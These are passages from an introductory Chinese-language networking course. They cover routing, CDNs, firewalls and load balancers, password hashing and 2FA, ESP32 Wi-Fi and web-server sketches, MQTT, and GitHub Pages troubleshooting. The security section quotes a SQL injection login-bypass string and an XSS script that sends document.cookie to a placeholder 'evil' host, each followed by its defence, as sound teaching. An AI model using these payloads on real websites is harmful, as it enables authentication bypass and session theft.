改寫 L2 標頭：把訊框的來源 MAC 換成自己出口介面的 MAC、目的 MAC 換成下一跳的 MAC（用 ARP 查）。關鍵：IP 位址自始至終不變，但每一跳的 MAC 都被重寫！

        
4
從出口介面送出，交給下一跳。如此一站一站接力，直到抵達目的網段。

放大看：一個大型網站背後的架構

      
你連到 YouTube，封包並不是直接打到「一台」伺服器。大流量網站靠一整排設備分工：CDN 把內容放到離你最近的節點、防火牆/WAF 擋攻擊、負載平衡器（反向代理）把請求平均分給後面很多台伺服器，再共用資料庫。任何一台壞了，其他台頂上，你完全無感。

這就是為什麼大網站「永遠不會關機」也「全球都很快」：水平擴展（多台）+ CDN（就近供應）+ 負載平衡（分流）。你在第四堂作業用的 GitHub Pages，背後也是這套 CDN 架構。

      

      

        工程深入防火牆、代理、負載平衡、CDN、VPN——各是什麼、解決什麼
        

          
守門的：防火牆與代理

          
    
            
  • 防火牆 Firewall：依規則放行/阻擋流量（看 IP+Port 的封包過濾，或看內容的應用層防火牆 WAF，擋 SQL injection、XSS）。
    • 
            
  • 反向代理 Reverse Proxy（如 Nginx）：站在伺服器「前面」，對外只露一個入口，幫忙做 TLS、快取、分流、隱藏後端。
    • 
            
  • 正向代理 Forward Proxy：站在「使用者這側」，幫一群用戶統一出口（公司上網控管、翻牆）。
    • 
          

          
擴展的：負載平衡與 CDN

          
    
            
  • 負載平衡 Load Balancer：把請求分給多台後端（L4 看 IP/Port、L7 看 HTTP 內容）。讓網站能水平擴展、單台掛了自動跳過。
    • 
            
  • CDN：把圖片、影片、JS 快取在全球各地節點，使用者就近抓——降低延遲、分散流量、抵禦 DDoS。
    •

SQL Injection — 把輸入當成指令

          
後端若把使用者輸入直接拼進 SQL：SELECT * FROM users WHERE name='[輸入]'。攻擊者在登入框輸入 ' OR '1'='1，整句變成 ...WHERE name='' OR '1'='1' → 條件永遠成立、繞過驗證。正解：用參數化查詢（prepared statement），讓輸入永遠只是「值」不會變成「指令」。

          
XSS — 把輸入當成程式

          
若網站把留言原封不動印回網頁，攻擊者留 <script>fetch('//evil/'+document.cookie)</script>，別人一瀏覽就在自己瀏覽器執行、Cookie 被偷走。正解：輸出時跳脫（escape）、設 Content-Security-Policy、Cookie 加 HttpOnly。

        工程深入密碼怎麼被「安全保存」、2FA 原理、攻擊術語、防禦原則
        

          
正派網站不會存你的明文密碼

          
密碼是用加鹽雜湊存的：把密碼加一段隨機salt再用慢雜湊（bcrypt/argon2）算成指紋，不可逆。登入時重算指紋比對。所以正常網站「忘記密碼」只能重設不能寄回原密碼——若有網站能寄回你的原密碼，代表它存明文，快逃。加鹽是為了讓「兩個人用同樣密碼，指紋也不同」，擋掉彩虹表。

          
2FA：為什麼這麼有效

          
    
            
  • 三類驗證因子：你知道的（密碼）、你擁有的（手機/金鑰）、你本身（指紋/臉）。2FA = 至少兩類。
    • 
            
  • 強度：硬體金鑰（FIDO2）> 驗證器 App（TOTP）> 簡訊驗證碼（簡訊可被 SIM 劫持，但仍遠勝沒有）。
    • 
            
  • 就算密碼外洩，攻擊者沒有第二因子也進不來——這擋掉了絕大多數自動化盜用。
    • 
          

          
常聽到的攻擊，一句話看懂

          
    
            
  • DDoS：殭屍大軍灌爆流量，打掉「可用性」。
    • 
            
  • SQL Injection：在輸入框塞入惡意指令偷整個資料庫（後端沒過濾輸入）。
    • 
            
  • XSS：把惡意 JS 注入網頁，在別人瀏覽器裡執行偷 Cookie。
    • 
            
  • CSRF：誘你在已登入狀態下，幫攻擊者送出請求。
    • 
            
  • 勒索軟體：加密你的檔案勒索贖金——唯一解藥是離線備份。
    • 
            
  • 0-day：尚未有修補的未知漏洞，最危險。
    • 
          

          
防禦的通用原則

          
    
            
  • 最小權限：每個帳號/程式只給剛好夠用的權限。
    • 
            
  • 縱深防禦：多層防線，破一層還有下一層。

ESP32：把整門課的網路觀念，做成一塊真實的小板子

🧭 承上：觀念全複習過了。本章把整門課做成一塊真的會連網的 ESP32。第四堂：再親手部署一個全世界連得到的網站，完成從理論到實作的閉環。

      

        
到目前為止，我們學的都是「看不見」的網路觀念。這一章，我們把它變成你摸得到的真實裝置——ESP32。

        
ESP32 是一塊很小、很便宜（常見一百多到兩、三百元）的微控制器，你可以把它想成一台迷你電腦。它最特別的地方是：內建 Wi-Fi 和藍牙，而且有很多腳位（GPIO）可以接 LED 燈、按鈕、溫濕度感測器、馬達等等。

        
它跟這門課有什麼關係？關係超大。ESP32 一開機就能連上你家的 Wi-Fi，這時你家的路由器會自動發給它一個私有 IP——它就正式成為你區域網路裡的一員了。更厲害的是，它甚至能自己當一個小網站（伺服器）：你用手機打開它的 IP，就能看到它的網頁、按按鈕去控制它接的那顆燈。你發現了嗎？私有 IP、區域網路、主從式架構、Wi-Fi——我們整門課學的，全部在這一塊小板子上活了過來。

        
把這種「會連網的小裝置」裝進生活裡，就是物聯網（IoT）。常見例子：智慧插座、溫濕度紀錄器、自動澆花、寵物餵食器、門口感測，甚至把資料傳到雲端，在手機上看圖表。

      

      
ESP32 ＝ 內建 Wi-Fi 的迷你電腦；連上你家 Wi-Fi 拿到私有 IP，就能在區域網路裡當一個小伺服器、控制硬體——整門課的觀念全用上了。

      
🤖
ESP32 像一個會上網的小幫手：給它電、教它連 Wi-Fi，它就能聽你的指令開燈、量溫度，還能架一個小網頁讓你用手機遙控。

🧩 範例一：連上 Wi-Fi，並印出拿到的 IP
這段就是「ESP32 加入你的區域網路、拿到私有 IP」的程式。

      

        
esp32_wifi.ino

        
#include <WiFi.h>
const char* ssid     = "你家的WiFi名稱";
const char* password = "你家的WiFi密碼";

void setup() {
  Serial.begin(115200);
  WiFi.begin(ssid, password);          // 開始連 Wi-Fi
  while (WiFi.status() != WL_CONNECTED) {
    delay(500); Serial.print(".");
  }
  Serial.println("\n已連上！");
  Serial.print("我拿到的 IP 是：");
  Serial.println(WiFi.localIP());      // 印出路由器發的私有 IP
}
void loop() {}

🌐 範例三：當一個小網站，用手機遙控 LED
這段最能呼應整門課——ESP32 變成「伺服器」，你的手機是「客戶端」。

      

        
esp32_webserver.ino（重點片段）

        
#include <WiFi.h>
#include <WebServer.h>
WebServer server(80);            // 在 80 號 Port 開一個網站
#define LED 2

void handleRoot() {             // 有人連進來時，回一個網頁
  server.send(200, "text/html",
    "<h1>ESP32 控制台</h1>"
    "<a href='/on'>開燈</a> | <a href='/off'>關燈</a>");
}
void setup(){
  pinMode(LED, OUTPUT);
  WiFi.begin("你家WiFi","密碼");
  while(WiFi.status()!=WL_CONNECTED) delay(500);
  Serial.begin(115200); Serial.println(WiFi.localIP());
  server.on("/", handleRoot);
  server.on("/on",  [](){ digitalWrite(LED,HIGH); handleRoot(); });
  server.on("/off", [](){ digitalWrite(LED,LOW);  handleRoot(); });
  server.begin();              // 小網站開張！
}
void loop(){ server.handleClient(); }

      

      
🔧 看懂這段＝看懂整門課
手機打開 ESP32 的 IP（私有 IP），瀏覽器送出「請給我網頁」（主從一問一答），ESP32 在 80 號 Port 回一個網頁，按「開燈」就送一個請求去控制硬體。整段就是 IP＋Port＋主從架構的真實版。

從「LED」到真正的 IoT：感測、雲端、MQTT

      
讓 ESP32 自己當網站只適合「在家用手機遙控」。要做到在外面也能看資料、多台裝置一起運作，業界改用雲端 + MQTT：ESP32 把感測值發布（publish）到雲端的 MQTT Broker，你的手機 App 訂閱（subscribe）同一個主題，資料就即時送達——這正是智慧家庭的標準骨架。

      

        
圖 11-1 · 一個 IoT 裝置的資料流

        
        
同一套「發布／訂閱」可串起幾十台裝置：溫濕度感測器發布、冷氣訂閱、手機也訂閱。MQTT 標頭極小、省電省流量，是 IoT 最常見的協定。

      

      

        工程深入IoT 實務：MQTT vs HTTP、GPIO/感測、省電、與安全紅線
        

          
為什麼 IoT 多用 MQTT 而非 HTTP

          
HTTP 每次都要建連線、送一大包標頭，對電池供電、頻寬有限的小裝置太重。MQTT 建在 TCP 上、標頭只有幾個位元組，採發布／訂閱模式，一條長連線就能持續收送，省電又即時。常見雲端：HiveMQ、Mosquitto、AWS IoT、ThingSpeak。

          
硬體那一面：GPIO / ADC / PWM

          
    
            
  • GPIO：數位腳位，讀按鈕（高/低）、控制 LED（亮/滅）。
    • 
            
  • ADC：類比轉數位，讀光敏電阻、土壤濕度這種「連續值」。
    • 
            
  • PWM：用快速開關模擬「強弱」，調 LED 亮度、馬達轉速。
    • 
            
  • Deep Sleep：不工作時休眠到微安培級，靠電池能撐好幾個月。
    • 
          

          
安全紅線（很多人踩雷）

          
    
            
  • 絕對不要把 ESP32 的網頁直接用 Port forwarding 開到公網——它幾乎沒有防護，會被掃描殭屍化（還記得 Mirai 殭屍網路嗎）。要遠端控制請走雲端 Broker。
    • 
            
  • 連線盡量用 TLS（MQTTS / HTTPS）；Wi-Fi 密碼、金鑰別寫死在公開的程式碼裡。
    • 
            
  • 支援 OTA（無線更新韌體）才能在出貨後修漏洞。
    •

常見問題 · 卡住先看這裡

      
網址打開是空白／一片白
最常見是檔名不是 index.html（可能存成了 index.html.txt）。回 GitHub 看檔名是否正好是 index.html；或剛開 Pages 還沒生效，多等 1～2 分鐘重新整理。

      
Pages 設定裡找不到 main 分支
代表還沒成功上傳檔案。先回 Step 5 把 index.html 上傳並 Commit，倉庫首頁看得到檔案後，Branch 下拉就會出現 main。

      
出現 404 Not Found
通常是網址打錯，或檔案放在子資料夾裡。確認 index.html 在倉庫的最外層（root），而且網址結尾有那串倉庫名稱。

      
檔案存檔後變成 index.html.txt
Windows 記事本要在「另存新檔」時把存檔類型改成「所有檔案」再打 index.html；Mac 要先「製作純文字」並取消「加上 .txt」。改好後重新上傳覆蓋即可。
